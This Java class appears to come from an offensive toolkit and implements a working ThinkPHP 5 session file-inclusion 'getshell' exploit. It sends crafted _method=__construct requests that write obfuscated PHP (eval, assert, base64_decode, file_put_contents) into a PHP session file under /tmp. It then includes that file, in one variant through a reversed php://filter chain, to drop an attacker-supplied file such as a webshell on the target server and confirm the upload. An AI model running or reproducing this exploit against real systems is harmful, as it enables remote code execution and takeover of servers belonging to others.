package fun.fireline.exp.php.thinkphp;

import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/21 10:50
 * @github https://github.com/yhy0
 */

public class TP5_session_fi_getshell {
    private HashMap<String, String> headers = new HashMap();
    
    public String getshell(String url, String router, String fileName, String content) {
        String results = null;

        try {
            String exp1 = "file_put_contents('" + fileName + "',base64_decode('" + content + "'));";
            String exp2 = Base64.getEncoder().encodeToString(exp1.getBytes(StandardCharsets.UTF_8));
            String exp3 = "<?php $a='file_put_contents';$b='base64_decode';$a($b('" + Base64.getEncoder().encodeToString(fileName.getBytes(StandardCharsets.UTF_8)) + "'),$b('" + content + "'));?>";
            String payload1 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php eval(base64_decode('" + URLEncoder.encode(exp2, "UTF-8") + "'));?>&server[]=1";
            String payload2 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=<?php $a='assert';$b='base64_decode';$a($b('" + URLEncoder.encode(exp2, "UTF-8") + "'));?>&server[]=1";
            String payload3 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=" + URLEncoder.encode(exp3, "UTF-8") + "&server[]=1";
            ArrayList<String> payloads = new ArrayList<>();
            payloads.add(payload3);
            payloads.add(payload1);
            payloads.add(payload2);
            for (String payload : payloads) {
                String str1 = Tools.getRandomString(25).toLowerCase();
                this.headers.put("Content-type", "application/x-www-form-urlencoded");
                this.headers.put("Cookie", "PHPSESSID=" + str1);
                Response response1 = HttpTools.post(url + router, payload, this.headers, "UTF-8");
                if (response1.getError() == null) {
                    payload = "_method=__construct&method=GET&filter[]=think\\__include_file&get[]=/tmp/sess_" + str1 + "&server[]=1";
                    HttpTools.post(url + router, payload, this.headers, "UTF-8");
                    this.headers.clear();
                    Response response2 = HttpTools.get(url + "/" + fileName, this.headers, "UTF-8");
                    if (response2.getCode() == 200) {
                        results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
                        return results;
                    }
                }
            }


            exp1 = Base64.getEncoder().encodeToString(("<?php " + exp1 + ";?>").getBytes(StandardCharsets.UTF_8));
            exp1 = exp1.replace("=", "+");
            if (exp1.length() < 100) {
                exp1 = "ab" + exp1;
            }

            if (exp1.length() > 99 && exp1.length() < 1000) {
                exp1 = "a" + exp1;
            }

            exp1 = URLEncoder.encode(exp1, "UTF-8");
            String payload4 = "_method=__construct&filter[]=think\\Session::set&method=get&get[]=" + exp1 + "&server[]=1";
            String randomStr = Tools.getRandomString(25).toLowerCase();
            this.headers.put("Cookie", "PHPSESSID=" + randomStr);
            this.headers.put("Content-type", "application/x-www-form-urlencoded");
            Response response = HttpTools.post(url + router, payload4, this.headers, "UTF-8");
            if (response.getError() == null) {
                payload4 = "_method=__construct&filter[]=strrev&filter[]=think\\__include_file&method=get&server[]=1&get[]=" + (new StringBuilder(randomStr)).reverse() + "_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php";
                HttpTools.post(url + router, payload4, this.headers, "UTF-8");
                this.headers.clear();
                Response response1 = HttpTools.get(url + "/" + fileName, this.headers, "UTF-8");
                if (response1.getCode() == 200) {
                    results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
                    return results;
                }

                if (response.getText().contains("think|a:")) {
                    results = "[-] 存在session包含漏洞，但上传失败！";
                } else {
                    results = "[-] 上传失败！";
                }
            } else {
                results = "[-] 上传失败: " + response.getError();
            }
        } catch (Exception var18) {
            results = "[-] 上传失败: " + var18.getMessage();
        }

        return results;
    }
}
